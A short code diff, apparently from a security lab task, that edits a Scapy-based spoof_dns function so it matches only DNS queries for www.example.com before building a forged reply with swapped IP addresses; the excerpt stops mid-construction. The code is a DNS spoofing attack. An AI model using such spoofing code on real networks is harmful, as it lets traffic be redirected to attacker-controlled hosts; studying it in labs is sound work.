@@ -13,8 +13,12 @@ class Task:
         TARGET = "www.example.com"
 
         def spoof_dns(pkt):
-            if DNS in pkt and TARGET in pkt[DNS].qd.qname.decode("utf-8"):
-                print(f"Got: {pkt.summary()}")
+            if (
+                DNS in pkt
+                and TARGET in pkt[DNS].qd.qname.decode("utf-8")
+                and pkt[DNS].qr == 0
+            ):
+                print(f"Got DNS Query: {pkt[IP].summary()}")
 
                 resp = (
                     IP(dst=pkt[IP].src, src=pkt[IP].dst)
